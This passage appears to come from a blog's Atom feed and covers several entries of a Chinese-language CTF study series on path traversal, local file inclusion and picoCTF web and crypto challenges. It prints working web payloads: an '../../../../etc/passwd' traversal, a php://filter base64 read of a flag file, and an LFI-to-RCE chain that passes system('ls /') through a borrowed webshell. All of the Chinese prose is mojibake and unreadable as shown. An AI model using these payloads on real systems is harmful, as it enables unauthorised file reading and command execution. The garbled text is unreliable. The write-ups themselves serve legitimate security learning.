ç•¶ç›®æ¨™ä¸æœƒå‘Šè¨´ä½  result çš„æ™‚å€™<ul><li>Time Based: é€é sleep ä¾†åˆ¤æ–·æ¢ä»¶</li><li>Boolean Based: é€éå¸ƒæ—çµæœä¾†åˆ¤æ–·æ¢ä»¶</li></ul></li><li>Error Based: é€ééŒ¯èª¤è¨Šæ¯ä¾†å–å¾—è³‡æ–™</li><li>Out of Band: è®€æª”ã€å¯«æª”â€¦</li></ul><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB
2 - å®Œ&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day16</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day16/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day16/</id>
    <published>2024-09-18T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2 - LFI</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="path-traversal">Path Traversal <a href="#path-traversal" class="headerlink"></a></h3><h4 id="intro">Intro <a href="#intro" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/GRT0MaA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åƒæ˜¯é¡ä¼¼é€™æ¨£çš„ç¶²å€ï¼Œå¦‚æœæŠŠ <code>?file=report.pdf</code> æ”¹æˆ<code>?file=../../../../etc/passwd</code> å°±æœ‰å¯èƒ½å¾—åˆ°ä¸€äº›æ©Ÿå¯†è³‡æ–™</p><h4 id="how-to-happen">How to Happen <a href="#how-to-happen" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/mtm74QU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="å¸¸ç”¨ä¾†è¢«æ”»æ“Šçš„è·¯å¾‘">å¸¸ç”¨ä¾†è¢«æ”»æ“Šçš„è·¯å¾‘ <a href="#å¸¸ç”¨ä¾†è¢«æ”»æ“Šçš„è·¯å¾‘" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VgXG75C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å…¶ä»–å¯ä»¥åƒè€ƒ <a href="https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#lfi">é€™é‚Š</a></p><h4 id="é˜²ç¦¦æ–¹å¼">é˜²ç¦¦æ–¹å¼ <a href="#é˜²ç¦¦æ–¹å¼" class="headerlink"></a></h4><ul><li>å¼·åˆ¶åŠ ä¸Šå‰¯æª”å<br><img data-src="https://i.imgur.com/iXpCBr4.png" alt="Image"><br>(å¯ä»¥åœ¨å¾Œé¢åŠ ä¸Š Null Byte <code>%00</code> ä¾†ç¹éï¼Œä½†åœ¨ php5.4å·²ç¶“è¢«ä¿®æ‰äº†)</li><li>ç¢ºèªè·¯å¾‘å‰ç¶´<br><img data-src="https://i.imgur.com/z5OgxhK.png" alt="Image"></li></ul><h3 id="lab---pathwalker">Lab - Pathwalker <a href="#lab---pathwalker" class="headerlink"></a></h3><p>åˆ°ç¶²é ä¹‹å¾Œå¥¹æœƒå¾ˆå¥½å¿ƒçš„å‘Šè¨´ä½  Flag çš„ä½ç½®ï¼Œç„¶å¾Œä½ å¯ä»¥ç”¨ Path Traversalçš„æ–¹å¼å»æ‰¾åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/lM6yIJV.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/d2ASAL1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---pathwalker---waf">Lab - Pathwalker - waf <a href="#lab---pathwalker---waf" class="headerlink"></a></h3><p>é€™é¡Œæœ‰å¡äº†ä¸€å€‹æ­£å‰‡è¡¨é”å¼çš„ WAF <code>/^apple|banana|cappo$/</code>ä½†å…¶å¯¦æ˜¯æœ‰æ¼æ´çš„ï¼Œä»–åªè¦ç¬¦åˆ</p><ol type="1"><li>apple é–‹é ­</li><li>åŒ…å« banana</li><li>çµå°¾æ˜¯ cappo</li></ol><p>å…¶ä¸­ä¸€å€‹å°±ç®—ç¬¦åˆ (æ­£ç¢ºæ‡‰è©²æ˜¯ <code>^(apple|banana|cappo)$</code>)ï¼Œæ‰€ä»¥å°±èƒ½å¾ˆè¼•é¬†åœ°ç¹éäº†</p><figure><img data-src="https://i.imgur.com/rI3ylCf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion) <a href="#lfi-local-file-inclusion" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/qaQZYmG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ç”¨ include è¡¨ç¤ºä»–æœƒè‡ªå‹•æŠŠæª”æ¡ˆ parse ï¼Œå‡è¨­ include çš„æ˜¯ php å°±æœƒè‡ªå‹•parse æˆ php çš„æ±è¥¿ (å¦‚æœæœ¬ä¾†æŸå€‹è·¯å¾‘çš„æ±è¥¿æ˜¯ä¸èƒ½æ‹¿çš„ï¼Œå°±å¯èƒ½å¯ä»¥ç”¨ LFIæ‹¿åˆ°ï¼Œå°±åƒä¸‹é¢é€™æ¨£)</p><figure><img data-src="https://i.imgur.com/7V5vLN7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>parse ä¹‹å¾Œæœ‰å¯èƒ½æœƒè®“ä¸€äº›æ±è¥¿ä¸è¦‹ï¼Œå°±åƒæ˜¯è¨»è§£çš„å…§å®¹ï¼Œé€™æ™‚å€™å¯ä»¥ç”¨ phpå½å”è­°æŠŠå…§å®¹è½‰æˆ base64 ï¼Œç„¶å¾Œå†è§£ç¢¼å°±å¯ä»¥çœ‹åˆ°åŸæœ¬çš„å…§å®¹äº†</p><figure><img data-src="https://i.imgur.com/ZWrMmcI.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/os8xiem.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æ ¼å¼:<code>php://filter/{read= / write= / &lt;empty&gt;(è‡ªå·±æ±ºå®šè¦è®€æª”é‚„å¯«æª”)}convertor}/resource=&lt;file_path&gt;</code></p><p>convertor: string.rot13, convert.base64-encode,convert.base64-decode, zlib.delateâ€¦ åƒè¦‹ <a href="https://www.php.net/manual/en/filters.php">é€™é‚Š</a></p><p>å¦‚æœæœ‰å¤šå€‹ convertor ï¼Œå°±ç”¨ <code>|</code> ä¾†ä¸²èµ·ä¾†</p><figure><img data-src="https://i.imgur.com/nYetXGd.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---lfi">Lab - lfi <a href="#lab---lfi" class="headerlink"></a></h3><p>å°‡ flag.php ç”¨ base64 åˆ—å°(<code>?page=php://filter/convert.base64-encode/resource=flag</code>)å‡ºä¾†ä¹‹å¾Œå†è§£å¯†å°±èƒ½å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/RzdCCsO.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---lfi2rce">Lab - lfi2rce <a href="#lab---lfi2rce" class="headerlink"></a></h3><p>é€™é¡Œè¦å–å¾—åœ¨æ ¹ç›®éŒ„çš„ Flag ï¼Œç›´æ¥å· <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php">åˆ¥äººå¯«å¥½çš„webshell</a> ä¾†ä¸²èµ·ä¾†ç”¨å°±å¯ä»¥äº†ï¼Œå› ç‚ºä»–ç”¨çš„æ˜¯ <code>eval</code> æ‰€ä»¥è¦ç”¨<code>system</code> ä¾†åŸ·è¡Œ linux æŒ‡ä»¤ï¼Œæ‰€ä»¥åªè¦åœ¨å¾Œé¢åŠ ä¸Š<code>&amp;1=system('ls /')</code> ç„¶å¾Œ `&amp;1 = system (â€˜cat {flag åç¨±}â€™)ï¼Œå°±è§£å‡ºä¾†äº†~</p><figure><img data-src="https://i.imgur.com/wD5XHyP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB
2 - LFI&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day15</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day15/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day15/</id>
    <published>2024-09-17T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked="">3 é¡Œ web + 3 é¡Œcrypto</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="ç¬¬ä¸€é¡Œsearch-source">ç¬¬ä¸€é¡Œï¼šSearch source <a href="#ç¬¬ä¸€é¡Œsearch-source" class="headerlink"></a></h3><p>æŸ¥äº†ä¸€ä¸‹ç™¼ç¾ï¼Œå¯ä»¥ç”¨ <code>wget -mkEpnp http://example.org</code>çš„æŒ‡ä»¤æŠŠä¸€æ•´å€‹ç¶²é  mirror ä¸‹ä¾†ï¼Œä¹‹å¾Œå†ç”¨ <code>grep</code> çœ‹æœ‰æ²’æœ‰<code>picoctf</code> å­—æ¨£å°±å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/4WHKu5s.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äºŒé¡Œsome-assembly-required-1">ç¬¬äºŒé¡Œï¼šSome Assembly Required 1<a href="#ç¬¬äºŒé¡Œsome-assembly-required-1" class="headerlink"></a></h3><p>é€™é¡Œæœ¬ä¾†åœ¨çœ‹æ‡‚ä»–ç¨‹å¼ç¢¼ç†è§£äº†å¥½ä¹…ï¼Œçµæœå¾Œä¾†éš¨ä¾¿é»é»å±…ç„¶ä¸å°å¿ƒå°±æ‰“é–‹å®ƒAssembly çš„æª”æ¡ˆå°±å¾—åˆ° Flag äº† owo</p><figure><img data-src="https://i.imgur.com/0kPmVTB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¾Œä¾†çœ‹åˆ¥äººçš„ writeup æ˜¯è¦æŠŠ <code>./JIFxzHyW8W</code>è¼‰ä¸‹ä¾†ï¼Œç„¶å¾Œé€†å‘ï¼Œä½†é€™æ¨£å¾—åˆ°çš„å¥½åƒå°±æ˜¯è·Ÿæˆ‘ä¸€æ¨£çš„æ±è¥¿è€Œå·² xdddd</p><h3 id="ç¬¬ä¸‰é¡Œsome-assembly-required-2">ç¬¬ä¸‰é¡Œï¼šSome Assembly Required 2<a href="#ç¬¬ä¸‰é¡Œsome-assembly-required-2" class="headerlink"></a></h3><p>å­¸ä¸Šä¸€é¡Œä¸€æ¨£ï¼Œé»é–‹ä¾†ä¹‹å¾Œæ»‘åˆ°æœ€ä¸‹é¢å°±å¥½åƒçœ‹åˆ° Flag äº† â€¦ å—ï¼Ÿ</p><figure><img data-src="https://i.imgur.com/Baig43l.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å–”ä¸ä»–å¥½åƒè¢«åŠ å¯†éäº†ï¼Œä½†æˆ‘åˆçœ‹ä¸æ‡‚ä»–çš„ WebAssemblyï¼Œè©¦äº†ä¸€æ®µæ™‚é–“ä¹‹å¾Œæ²’å¿ä½ç›´æ¥è·‘å»çœ‹åˆ¥äºº writeup äº†ğŸ˜¢ ï¼Œé€™é¡Œæ‡‰è©²æ˜¯è¦æŠŠå®ƒçš„wasm åç·¨è­¯ä¹‹å¾Œå»çœ‹è£¡é¢çš„é‚è¼¯ï¼Œå°±æœƒç™¼ç¾ä»–æ˜¯æŠŠå…§å®¹è·Ÿ 8 åš XOR çš„çµæœ</p><figure><img data-src="https://i.imgur.com/5DSOR3Y.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>(æˆ‘æ˜¯å­¸ <a href="https://ithelp.ithome.com.tw/articles/10285195">é€™ç¯‡</a>)</p><h3 id="ç¬¬å››é¡Œinterencdec">ç¬¬å››é¡Œï¼šinterencdec <a href="#ç¬¬å››é¡Œinterencdec" class="headerlink"></a></h3><p>å› ç‚ºå‰ä¸€å€‹ç¦®æ‹œæœ‰é»å¿™éƒ½æ²’æœ‰ä¸Šèª²ï¼Œéƒ½åªæœ‰å¯«é¡Œç›®ï¼ŒWebèƒ½å¯«çš„éƒ½å¿«å¯«å®Œäº†ï¼Œå…ˆå¯«ä¸€äº›ç°¡å–®çš„ cryptoé¡Œç›®ï¼Œå‰©çš„æ™‚é–“è¶•å¿«è¶•èª²ï¼Œä¸ç„¶éƒ½åªæ˜¯åœ¨ç†Ÿç·´èˆŠæœ‰çš„æ±è¥¿è€Œå·²</p><p>æŠŠå®ƒæä¾›çš„æª”æ¡ˆè¼‰ä¸‹ä¾†ï¼Œç„¶å¾Œåšå…©æ¬¡ base64 è§£ç¢¼ï¼Œå†ç”¨å‡±è–©è§£å¯†å°±å¯ä»¥å¾—åˆ°Flag äº†</p><figure><img data-src="https://i.imgur.com/Gu1YxhG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/FVv0vbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äº”é¡Œmod-26">ç¬¬äº”é¡Œï¼šMod 26 <a href="#ç¬¬äº”é¡Œmod-26" class="headerlink"></a></h3><p>é€™é¡Œæ›´ç°¡å–®ï¼Œä»–èªªé©ç”¨ rot13 ï¼Œæ‰€ä»¥å°±èƒ½å‰›å‰›çš„å‡±è–©è§£å¯†æ”¹æˆåç§»é‡ 13å°±èƒ½å¾—åˆ°çµæœäº†</p><figure><img data-src="https://i.imgur.com/Gzfhzmz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å…­é¡Œ">ç¬¬å…­é¡Œï¼š <a href="#ç¬¬å…­é¡Œ" class="headerlink"></a></h3><p>æˆ‘å€‘å¾—åˆ°ä¸€å¼µåœ–ç‰‡</p><figure><img data-src="https://i.imgur.com/HsvYbv5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ç”¨ mac å…§å»ºçš„ OCR å¯ä»¥å¾—åˆ°ä»¥ä¸‹å­—ä¸²</p><p><code>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }</code></p><p>æ„Ÿè¦ºæ•¸å­—å°±æ˜¯ä»£è¡¨ç¬¬å¹¾å€‹å­—æ¯ï¼Œç°¡å–®æ•´ç†ä¸€ä¸‹å°±èƒ½å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/T3LbWAj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;3 é¡Œ web + 3 é¡Œ
crypto&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day14</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day14/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day14/</id>
    <published>2024-09-16T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked="">6 é¡Œ web</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="ç¬¬ä¸€é¡Œfindme">ç¬¬ä¸€é¡Œï¼šfindme <a href="#ç¬¬ä¸€é¡Œfindme" class="headerlink"></a></h3><p>ç”¨ä»–çš„å¯†ç¢¼ <code>test</code> / <code>test!</code>ç™»å…¥ï¼Œä½†é€™æ¨£å¥½åƒæ‹¿ä¸åˆ°ä»€éº¼ï¼Œæ‰“é–‹ Burp Suite æ””æˆªrequestï¼Œç™¼ç¾æœ‰ä¸‹é¢é€™å…©å€‹è«‹æ±‚ï¼Œæœ‰ä¸€å€‹<code>/next-page/id=cGljb0NURntwcm94aWVzX2Fs</code> è©¦è‘—æŠŠå®ƒç”¨ Base64è§£ç¢¼ï¼Œç„¶å¾Œä»–æœƒå†è·³è½‰ä¸€æ¬¡ï¼Œæœ‰å¦ä¸€å€‹ id ï¼Œä¸€æ¨£ç”¨ Base64è§£ç¢¼ä¹‹å¾Œåˆä½µå†ä¸€èµ·å°±å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/JurqiNi.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/8N2c80l.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äºŒé¡Œsecrets">ç¬¬äºŒé¡Œï¼šSecrets <a href="#ç¬¬äºŒé¡Œsecrets" class="headerlink"></a></h3><p>é»æª¢æŸ¥ç™¼ç¾ source è£¡é¢æœ‰ä¸€å€‹è³‡æ–™å¤¾ secret ï¼Œæ‰€æœ‰å°±é€£éå»çœ‹çœ‹(è¨˜å¾—æœ€å¾Œé¢è¦åŠ  <code>/</code> ä¸ç„¶æœƒè¢« redirect åˆ°<code>http://saturn.picoctf.net/secret/</code>)ï¼Œç„¶å¾Œåˆ°ä¸‹ä¸€å€‹é é¢å¾Œåˆç™¼ç¾æœ‰å€‹è³‡æ–™å¤¾ hidden ï¼Œé€£éå»åˆæœ‰å€‹è³‡æ–™å¤¾<code>superhidden</code> ï¼Œå†é€£éå»ä¹‹å¾Œå°±çœ‹åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/NnVrlp7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/UCD9hZ5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/3ZdYj17.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/YVO0WGz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬ä¸‰é¡Œroboto-sans">ç¬¬ä¸‰é¡Œï¼šRoboto Sans <a href="#ç¬¬ä¸‰é¡Œroboto-sans" class="headerlink"></a></h3><p>é€™é¡Œçœ‹äº†å¥½ä¹…æ‰æƒ³åˆ°è¦å»çœ‹ <code>robots.txt</code> ï¼Œè£¡é¢æœ‰ä¸€äº›çœ‹èµ·ä¾†åƒbase64 